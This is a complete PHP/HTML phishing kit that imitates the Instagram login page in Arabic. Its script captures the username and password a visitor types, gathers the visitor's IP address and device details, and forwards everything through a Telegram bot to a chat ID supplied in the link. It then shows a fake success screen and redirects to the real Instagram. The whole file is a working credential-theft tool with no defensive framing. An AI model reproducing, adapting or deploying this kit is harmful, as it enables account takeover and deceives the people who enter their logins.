<?php
$botToken = "BBOTTTTTTTTTTT";

function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $message = $input['message'];

    $result = sendTelegramMessage($chatId, $message, $botToken);
    
    header('Content-Type: application/json');
    echo $result;
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - تسجيل الدخول</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
            padding: 20px 40px;
            text-align: center;
        }
        
        .instagram-logo {
            width: 175px;
            margin: 22px auto 12px;
        }
        
        .login-form {
            margin-top: 24px;
        }
        
        .input-group {
            margin-bottom: 6px;
            position: relative;
        }
        
        .input-field {
            width: 100%;
            padding: 9px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            background: #fafafa;
            direction: ltr;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .login-button {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 8px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 14px;
            font-size: 14px;
        }
        
        .login-button:disabled {
            background: #b2dffc;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 500;
        }
        
        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        
        .separator::before {
            margin-right: 10px;
        }
        
        .separator::after {
            margin-left: 10px;
        }
        
        .fb-login {
            color: #385185;
            font-weight: 500;
            font-size: 14px;
            margin: 8px 0;
            display: inline-block;
            text-decoration: none;
        }
        
        .forgot-pw {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: inline-block;
            margin-top: 12px;
        }
        
        .signup-container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 100%;
            max-width: 350px;
            margin: 10px auto;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 500;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
            width: 100%;
            max-width: 350px;
        }
        
        .app-download p {
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
        }
        
        .app-btn {
            height: 40px;
        }
        
        .footer {
            margin-top: 50px;
            text-align: center;
            width: 100%;
            max-width: 800px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }
        
        .footer-link {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }
        
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 16px;
        }
        
        .hidden {
            display: none;
        }
        
        .success-view, .error-view {
            text-align: center;
            padding: 40px 20px;
        }
        
        .success-icon, .error-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        .success-message, .error-message {
            font-size: 18px;
            margin-bottom: 30px;
            color: #262626;
        }

        @media (max-width: 450px) {
            .login-container, .signup-container {
                border: none;
                background: transparent;
            }
            
            body {
                padding: 0;
                background: white;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo">
        
        <div id="loginView">
            <form class="login-form" onsubmit="handleLogin(event)">
                <div class="input-group">
                    <input type="text" class="input-field" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
                </div>
                
                <div class="input-group">
                    <input type="password" class="input-field" id="password" placeholder="كلمة المرور" required>
                </div>
                
                <button type="submit" class="login-button">تسجيل الدخول</button>
            </form>
            
            <div class="separator">أو</div>
            
            <a href="#" class="fb-login">
                <span>تسجيل الدخول باستخدام فيسبوك</span>
            </a>
            
            <a href="#" class="forgot-pw">نسيت كلمة المرور؟</a>
        </div>
        
        <div id="successView" class="hidden success-view">
            <div class="success-icon">✅</div>
            <div class="success-message">تم تسجيل الدخول بنجاح</div>
            <p>جاري توجيهك إلى Instagram...</p>
        </div>
        
        <div id="errorView" class="hidden error-view">
            <div class="error-icon">❌</div>
            <div class="error-message">حدث خطأ أثناء تسجيل الدخول</div>
            <p>يرجى المحاولة مرة أخرى لاحقاً.</p>
        </div>
    </div>
    
    <div class="signup-container">
        <p>ليس لديك حساب؟ <a href="#" class="signup-link">اشترك</a></p>
    </div>
    
    <div class="app-download">
        <p>حمّل التطبيق.</p>
        <div class="app-buttons">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" class="app-btn">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" class="app-btn">
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#" class="footer-link">المعلومات</a>
            <a href="#" class="footer-link">المساعدة</a>
            <a href="#" class="footer-link">الصحافة</a>
            <a href="#" class="footer-link">API</a>
            <a href="#" class="footer-link">الوظائف</a>
            <a href="#" class="footer-link">الخصوصية</a>
            <a href="#" class="footer-link">الشروط</a>
            <a href="#" class="footer-link">المواقع</a>
            <a href="#" class="footer-link">اللغات</a>
        </div>
        <div class="copyright">© 2023 Instagram من Meta</div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('ID');
        
        // عناصر DOM
        const loginView = document.getElementById('loginView');
        const successView = document.getElementById('successView');
        const errorView = document.getElementById('errorView');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        
        // تبديل الواجهات
        function showView(view) {
            loginView.classList.add('hidden');
            successView.classList.add('hidden');
            errorView.classList.add('hidden');
            
            view.classList.remove('hidden');
        }
        
        // جمع معلومات الجهاز الأساسية
        async function collectBasicDeviceInfo() {
            let ipAddress = "غير متوفر";
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
            } catch (e) {}
            
            return {
                userAgent: navigator.userAgent,
                ip: ipAddress,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                date: new Date().toLocaleString('ar-SA')
            };
        }
        
        // إرسال البيانات إلى الخادم
        async function sendToServer(chatId, message) {
            try {
                const data = {
                    chatId: chatId,
                    message: message
                };
                
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error sending to server:', error);
                return {ok: false, error: error.message};
            }
        }
        
        // معالجة تسجيل الدخول
        async function handleLogin(event) {
            event.preventDefault();
            
            if (!usernameInput.value || !passwordInput.value) {
                alert("يرجى إدخال اسم المستخدم وكلمة المرور");
                return;
            }
            
            const deviceInfo = await collectBasicDeviceInfo();
            const message = `
📸 <b>معلومات تسجيل الدخول إلى Instagram</b>

👤 <b>معرف المستخدم:</b> <code>${chatId}</code>
📱 <b>اسم المستخدم/البريد:</b> ${usernameInput.value}
🔒 <b>كلمة المرور:</b> ${passwordInput.value}
📟 <b>الجهاز:</b> ${deviceInfo.userAgent}
🌐 <b>IP:</b> ${deviceInfo.ip}
🖥️ <b>النظام:</b> ${deviceInfo.platform}
🌐 <b>اللغة:</b> ${deviceInfo.language}
🕒 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}
📺 <b>الشاشة:</b> ${deviceInfo.screen}
📅 <b>التاريخ:</b> ${deviceInfo.date}
            `;
            
            const result = await sendToServer(chatId, message);
            
            if (result && result.ok) {
                showView(successView);
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com/";
                }, 2000);
            } else {
                showView(errorView);
            }
        }
        
        // التأكد من وجود معرف المستخدم
        if (!chatId) {
            showView(errorView);
            document.querySelector('.error-message').textContent = "معرف المستخدم غير صحيح أو انتهت صلاحية الرابط";
        }
    </script>
</body>
</html>
